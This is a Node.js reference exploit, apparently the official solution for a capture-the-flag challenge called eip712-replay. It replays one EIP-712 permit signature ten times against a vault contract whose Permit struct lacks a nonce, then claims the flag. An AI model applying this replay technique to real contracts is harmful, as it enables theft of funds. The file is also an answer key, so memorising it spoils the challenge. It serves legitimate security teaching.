#!/usr/bin/env node
// Reference exploit for eip712-replay, using sdk/index.js.
//
//   1. ctf.getSignature() → EIP-712 typed-data signature (backend
//      builds it from the manifest's typedData block)
//   2. submit the signature to permit() ten times — the Permit struct
//      has no nonce, so the digest stays constant
//   3. ctf.claimFlag()

import { ethers } from "ethers";
import { Ctf } from "../../../sdk/index.js";

const required = ["PLAYER_KEY", "VAULT", "BACKEND", "CHALLENGE"];
for (const k of required) {
  if (!process.env[k]) { console.error(`missing env ${k}`); process.exit(1); }
}

const RPC = process.env.RPC_URL ?? "https://ethereum-sepolia-rpc.publicnode.com";
const provider = new ethers.JsonRpcProvider(RPC);
const wallet   = new ethers.Wallet(process.env.PLAYER_KEY, provider);
const me = wallet.address;
console.log(`player: ${me}`);

const ctf = new Ctf({
  backend: process.env.BACKEND,
  challenge: process.env.CHALLENGE,
  player: me,
});

const vault = new ethers.Contract(process.env.VAULT, [
  "function permit(uint256 amount, uint256 deadline, bytes sig)",
  "function AUTHORIZED_AMOUNT() view returns (uint256)",
], wallet);

const sig = await ctf.getSignature();
if (sig.type !== "eip712") throw new Error(`expected eip712 sig, got ${sig.type}`);
console.log(`signature: ${sig.signature.slice(0, 14)}…${sig.signature.slice(-8)}`);

const amount = await vault.AUTHORIZED_AMOUNT();
const deadline = BigInt(sig.message.deadline);
let nonce = await wallet.getNonce();
const txs = [];
for (let i = 0; i < 10; i++) {
  console.log(`tx ${i + 1}/10`);
  txs.push((await vault.permit(amount, deadline, sig.signature, { nonce })).wait());
  nonce++;
}
await Promise.all(txs);

const { flag } = await ctf.claimFlag({ poll: 6 });
console.log(`flag: ${flag}`);
